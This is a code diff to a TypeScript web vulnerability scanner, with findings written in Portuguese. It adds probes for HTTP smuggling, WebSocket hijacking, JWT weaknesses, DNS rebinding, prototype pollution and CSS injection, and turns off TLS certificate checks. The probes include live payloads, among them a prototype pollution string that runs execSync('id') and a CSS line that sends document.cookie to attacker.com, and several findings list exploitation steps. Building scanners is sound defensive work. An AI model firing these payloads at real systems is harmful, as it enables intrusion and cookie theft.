@@ -6,6 +6,7 @@ import * as http from "http";
 
 export class VulnerabilityScanner {
   private wss: any;
+  private currentAuthHeaders: Record<string, string> | undefined;
 
   constructor(wss: any) {
     this.wss = wss;
@@ -22,6 +23,9 @@ export class VulnerabilityScanner {
   async startScan(scanId: string) {
     const scan = await storage.getScan(scanId);
     if (!scan) return;
+
+    // Load auth headers for DAST
+    this.currentAuthHeaders = scan.authHeaders;
 
     await storage.updateScan(scanId, { status: 'running', progress: 0, currentTask: 'Initializing scan...' });
     this.broadcastUpdate(scanId, { status: 'running', progress: 0, currentTask: 'Initializing scan...' });
@@ -107,10 +111,17 @@ export class VulnerabilityScanner {
       const urlObj = new URL(url);
       const client = urlObj.protocol === 'https:' ? https : http;
 
+      // Merge user options headers with global DAST auth headers if available
+      const reqHeaders = { 
+        ...options.headers, 
+        ...(this.currentAuthHeaders || {}) 
+      };
+
       const req = client.request(url, {
         method: options.method || 'GET',
-        headers: options.headers || {},
+        headers: reqHeaders,
         timeout: 10000,
+        rejectUnauthorized: false,
         ...options
       }, (res) => {
         let body = '';
@@ -1673,6 +1684,349 @@ export class VulnerabilityScanner {
                 recommendation: `CONFIGURE cache keys corretamente!\n\nCOMO EXPLORAR:\n1. Injete XSS via X-Forwarded-Host\n2. Resposta é cacheada para todos usuários\n3. XSS persistente sem modificar banco de dados\n\nFERRAMENTAS:\n- Param Miner (Burp extension)\n- Web Cache Vulnerability Scanner\n\nCOMO CORRIGIR:\n- Use apenas headers confiáveis como cache key\n- Valide/sanitize todos headers antes de refletir\n- Configure Vary header corretamente`,
                 cve: "CWE-444",
               };
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      }
+    ];
+
+    // ═══════════════════════════════════════════════════════════════
+    // ADVANCED TESTS v2.0 - Testes Avançados de Segurança
+    // ═══════════════════════════════════════════════════════════════
+    const advancedTests = [
+      {
+        name: "HTTP/2 Request Smuggling",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            // Test H2C upgrade smuggling
+            const smugglePayloads = [
+              { header: 'Upgrade', value: 'h2c' },
+              { header: 'HTTP2-Settings', value: 'AAMAAABkAAQCAAAAAAIAAAAA' },
+              { header: 'Transfer-Encoding', value: 'chunked, identity' },
+            ];
+
+            for (const payload of smugglePayloads) {
+              const response = await this.makeRequest(target, {
+                headers: { [payload.header]: payload.value }
+              });
+
+              if (response.statusCode === 101 || response.statusCode === 200) {
+                const body = response.body.toLowerCase();
+                if (body.includes('upgrade') || response.headers['upgrade']) {
+                  return {
+                    scanId,
+                    severity: "high",
+                    title: "HTTP/2 Request Smuggling Possível",
+                    description: `Servidor aceita H2C upgrade ou headers de smuggling. Bypass de segurança possível via desync.`,
+                    category: "HTTP Smuggling",
+                    endpoint: target,
+                    payload: `${payload.header}: ${payload.value}`,
+                    evidence: `Header ${payload.header} aceito. Status: ${response.statusCode}. Upgrade: ${response.headers['upgrade'] || 'N/A'}`,
+                    recommendation: `BLOQUEIE H2C upgrades e Transfer-Encoding ambíguos!\n\nCOMO EXPLORAR:\n1. Use H2C smuggling para bypass de ACLs\n2. Envie requests ambíguos que o proxy e backend interpretam diferente\n3. Smuggle requests para outros usuários\n\nCOMO CORRIGIR:\n- Desabilite H2C cleartext upgrades\n- Normalize Transfer-Encoding headers\n- Use HTTP/2 end-to-end (sem downgrade)`,
+                    cve: "CWE-444",
+                  };
+                }
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "WebSocket Hijacking",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const wsUrl = target.replace(/^http/, 'ws');
+            const wsEndpoints = ['/ws', '/websocket', '/socket', '/socket.io/', '/cable', '/hub'];
+            
+            for (const endpoint of wsEndpoints) {
+              try {
+                const testUrl = `${target}${endpoint}`;
+                const response = await this.makeRequest(testUrl, {
+                  headers: {
+                    'Upgrade': 'websocket',
+                    'Connection': 'Upgrade',
+                    'Sec-WebSocket-Version': '13',
+                    'Sec-WebSocket-Key': 'dGhlIHNhbXBsZSBub25jZQ==',
+                    'Origin': 'https://evil.com'
+                  }
+                });
+
+                if (response.statusCode === 101 || 
+                    (response.statusCode === 200 && response.headers['upgrade']?.toLowerCase() === 'websocket')) {
+                  return {
+                    scanId,
+                    severity: "high",
+                    title: "WebSocket Cross-Site Hijacking (CSWSH)",
+                    description: `Endpoint WebSocket ${endpoint} aceita conexões de origens não autorizadas. Hijacking possível.`,
+                    category: "WebSocket",
+                    endpoint: testUrl,
+                    payload: `Origin: https://evil.com com upgrade WebSocket`,
+                    evidence: `WebSocket upgrade aceito com Origin malicioso. Status: ${response.statusCode}`,
+                    recommendation: `VALIDE Origin em conexões WebSocket!\n\nCOMO EXPLORAR:\n1. Crie página maliciosa que conecta ao WebSocket da vítima\n2. Intercepte/envie mensagens em nome do usuário\n3. Roube dados em tempo real\n\nCOMO CORRIGIR:\n- Valide header Origin estritamente\n- Implemente autenticação no handshake\n- Use tokens CSRF no upgrade`,
+                    cve: "CWE-1385",
+                  };
+                }
+              } catch (err) {
+                continue;
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "JWT Algorithm Weakness",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const baseUrl = new URL(target).origin;
+            const authEndpoints = ['/api/auth/login', '/api/login', '/auth/login', '/api/v1/auth/login'];
+
+            for (const endpoint of authEndpoints) {
+              try {
+                const testUrl = `${baseUrl}${endpoint}`;
+                const response = await this.makeRequest(testUrl, {
+                  method: 'POST',
+                  headers: { 'Content-Type': 'application/json' },
+                  body: JSON.stringify({ email: 'test@test.com', password: 'test' })
+                });
+
+                const body = response.body;
+                // Look for JWT in response
+                const jwtMatch = body.match(/eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*/);
+                
+                if (jwtMatch) {
+                  const jwt = jwtMatch[0];
+                  const parts = jwt.split('.');
+                  try {
+                    const header = JSON.parse(Buffer.from(parts[0], 'base64url').toString());
+                    const payload = JSON.parse(Buffer.from(parts[1], 'base64url').toString());
+                    
+                    const issues: string[] = [];
+                    if (header.alg === 'none' || header.alg === '') issues.push('Algorithm none!');
+                    if (header.alg === 'HS256' && !payload.exp) issues.push('No expiration');
+                    if (payload.exp && payload.exp - (Date.now() / 1000) > 86400 * 30) issues.push('Token expires in >30 days');
+                    
+                    if (issues.length > 0) {
+                      return {
+                        scanId,
+                        severity: issues.includes('Algorithm none!') ? "critical" : "medium",
+                        title: "JWT com Configuração Fraca",
+                        description: `Token JWT detectado com problemas: ${issues.join(', ')}`,
+                        category: "Authentication",
+                        endpoint: testUrl,
+                        payload: `JWT Header: ${JSON.stringify(header)}`,
+                        evidence: `Issues: ${issues.join(', ')}. Alg: ${header.alg}`,
+                        recommendation: `CORRIJA configuração JWT!\n\nCOMO EXPLORAR:\n1. alg:none → forjar tokens sem assinatura\n2. Sem exp → token válido para sempre\n3. HS256 fraco → brute-force da chave\n\nFERRAMENTAS: jwt_tool, jwt-cracker\n\nCOMO CORRIGIR:\n- Force algoritmo forte (RS256/ES256)\n- Defina exp curto (15-60 min)\n- Use refresh tokens\n- Valide alg no servidor`,
+                        cve: "CWE-327",
+                      };
+                    }
+                  } catch (e) {
+                    // JWT decode failed
+                  }
+                }
+              } catch (err) {
+                continue;
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "DNS Rebinding Detection",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const response = await this.makeRequest(target);
+            const headers = response.headers;
+            
+            const hasHostValidation = headers['x-frame-options'] && 
+                                       headers['content-security-policy'] &&
+                                       headers['access-control-allow-origin'] !== '*';
+            
+            if (!hasHostValidation) {
+              // Check if Host header is validated
+              const evilResponse = await this.makeRequest(target, {
+                headers: { 'Host': 'evil-rebind.attacker.com' }
+              });
+
+              if (evilResponse.statusCode === 200 && evilResponse.body.length > 100) {
+                return {
+                  scanId,
+                  severity: "medium",
+                  title: "Possível Vulnerabilidade de DNS Rebinding",
+                  description: "Servidor aceita requests com Host header arbitrário. DNS Rebinding pode acessar serviços internos.",
+                  category: "Network",
+                  endpoint: target,
+                  payload: `Host: evil-rebind.attacker.com`,
+                  evidence: `Request com Host malicioso aceito. Status: ${evilResponse.statusCode}. Body: ${evilResponse.body.length} bytes`,
+                  recommendation: `VALIDE Host header estritamente!\n\nCOMO EXPLORAR:\n1. Configure DNS TTL baixo para IP do atacante\n2. Vítima acessa site do atacante\n3. DNS rebind aponta para IP interno da vítima\n4. JavaScript acessa APIs internas\n\nCOMO CORRIGIR:\n- Valide Host header contra whitelist\n- Use Access-Control-Allow-Origin restrito\n- Implemente navegação virtual hosts`,
+                  cve: "CWE-350",
+                };
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "Server-Side Prototype Pollution",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const pollutionPayloads: any[] = [
+              { '__proto__': { 'isAdmin': true, 'role': 'admin' } },
+              { 'constructor': { 'prototype': { 'isAdmin': true } } },
+              { '__proto__': { 'status': 'admin', 'outputFunctionName': 'x;process.mainModule.require("child_process").execSync("id")//'}},
+            ];
+
+            for (const payload of pollutionPayloads) {
+              const response = await this.makeRequest(target, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+              });
+
+              const body = response.body.toLowerCase();
+              if (response.statusCode === 200 && 
+                  (body.includes('admin') || body.includes('true') || body.includes('uid='))) {
+                return {
+                  scanId,
+                  severity: "critical",
+                  title: "Server-Side Prototype Pollution",
+                  description: "Aplicação vulnerável a prototype pollution no servidor. RCE possível via poluição de protótipo.",
+                  category: "Injection",
+                  endpoint: target,
+                  payload: JSON.stringify(payload),
+                  evidence: `Prototype pollution aceito. Response: ${body.substring(0, 200)}`,
+                  recommendation: `BLOQUEIE chaves __proto__ e constructor!\n\nCOMO EXPLORAR:\n1. Envie __proto__ para poluir Object.prototype\n2. Escale privilégios (isAdmin: true)\n3. RCE via template engines (EJS, Pug, Handlebars)\n\nCOMO CORRIGIR:\n- Sanitize __proto__, constructor, prototype\n- Use Object.create(null) para objetos seguros\n- Use Map em vez de Object\n- Use Object.freeze(Object.prototype)`,
+                  cve: "CWE-1321",
+                };
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "CSS Injection",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const cssPayloads = [
+              "background:url('https://attacker.com/steal?data='%2bdocument.cookie)",
+              "}</style><script>alert(1)</script><style>",
+              "expression(alert(1))",
+            ];
+
+            for (const payload of cssPayloads) {
+              const testUrl = `${target}?color=${encodeURIComponent(payload)}`;
+              const response = await this.makeRequest(testUrl);
+              const body = response.body;
+
+              if (body.includes(payload) || body.includes(decodeURIComponent(payload))) {
+                return {
+                  scanId,
+                  severity: "medium",
+                  title: "CSS Injection Detectada",
+                  description: "Aplicação reflete input em contexto CSS sem sanitização. Data exfiltration possível.",
+                  category: "Injection",
+                  endpoint: testUrl,
+                  payload: payload,
+                  evidence: `CSS payload refletido na resposta. Status: ${response.statusCode}`,
+                  recommendation: `SANITIZE input em contexto CSS!\n\nCOMO EXPLORAR:\n1. Injete CSS para exfiltrar dados (attribute selectors)\n2. input[value^='a']{background:url(attacker.com/?a)}\n3. Roube tokens CSRF, dados de formulário\n\nCOMO CORRIGIR:\n- Nunca insira input de usuário em CSS\n- Use CSP restrictivo\n- Sanitize caracteres especiais CSS`,
+                  cve: "CWE-79",
+                };
+              }
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "GraphQL DoS (Query Depth/Complexity)",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const baseUrl = new URL(target).origin;
+            const gqlUrl = target.includes('graphql') ? target : `${baseUrl}/graphql`;
+
+            // Deep nested query
+            const deepQuery = '{"query":"{ __schema { types { fields { type { fields { type { name } } } } } } }"}';
+            
+            const startTime = Date.now();
+            const response = await this.makeRequest(gqlUrl, {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: deepQuery
+            });
+            const duration = Date.now() - startTime;
+
+            const body = response.body.toLowerCase();
+            if (response.statusCode === 200 && (body.includes('types') || body.includes('fields')) && duration < 5000) {
+              return {
+                scanId,
+                severity: "medium",
+                title: "GraphQL Sem Limite de Profundidade",
+                description: "API GraphQL aceita queries profundamente aninhadas. DoS via query complexity possível.",
+                category: "DoS",
+                endpoint: gqlUrl,
+                payload: deepQuery,
+                evidence: `Query profunda executada em ${duration}ms. Status: ${response.statusCode}`,
+                recommendation: `LIMITE profundidade e complexidade de queries GraphQL!\n\nCOMO EXPLORAR:\n1. Envie queries com 100+ níveis de aninhamento\n2. Cause timeout/OOM no servidor\n3. Abuse de pagination ilimitada\n\nCOMO CORRIGIR:\n- graphql-depth-limit (max depth: 10)\n- graphql-query-complexity (max cost: 1000)\n- Rate limit por query cost\n- Timeout de execução`,
+                cve: "CWE-770",
+              };
+            }
+          } catch (error) {
+            return null;
+          }
+          return null;
+        }
+      },
+      {
+        name: "Cookie Security Analysis",
+        execute: async (target: string, scanId: string): Promise<InsertVulnerability | null> => {
+          try {
+            const response = await this.makeRequest(target);
+            const setCookieHeaders = response.headers['set-cookie'];
+            
+            if (setCookieHeaders) {
+              const cookies = Array.isArray(setCookieHeaders) ? setCookieHeaders : [setCookieHeaders];
+              const issues: string[] = [];
+              
+              for (const cookie of cookies) {
+                const cookieLower = cookie.toLowerCase();
+                if (!cookieLower.includes('httponly')) issues.push(`Cookie sem HttpOnly: ${cookie.split('=')[0]}`);
+                if (!cookieLower.includes('secure')) issues.push(`Cookie sem Secure: ${cookie.split('=')[0]}`);
+                if (!cookieLower.includes('samesite')) issues.push(`Cookie sem SameSite: ${cookie.split('=')[0]}`);
+              }
+
+              if (issues.length >= 2) {
+                return {
+                  scanId,
+                  severity: "medium",
+                  title: "Cookies com Configuração Insegura",
+                  description: `${issues.length} problemas de segurança em cookies detectados.`,
+                  category: "Configuration",
+                  endpoint: target,
+                  payload: "Análise de Set-Cookie headers",
+                  evidence: issues.slice(0, 5).join('; '),
+                  recommendation: `CONFIGURE flags de segurança em TODOS os cookies!\n\nCOMO EXPLORAR:\n1. Sem HttpOnly → roubo via XSS (document.cookie)\n2. Sem Secure → interceptação via HTTP\n3. Sem SameSite → CSRF attacks\n\nCOMO CORRIGIR:\nSet-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict; Path=/`,
+                  cve: "CWE-614",
+                };
+              }
             }
           } catch (error) {
             return null;
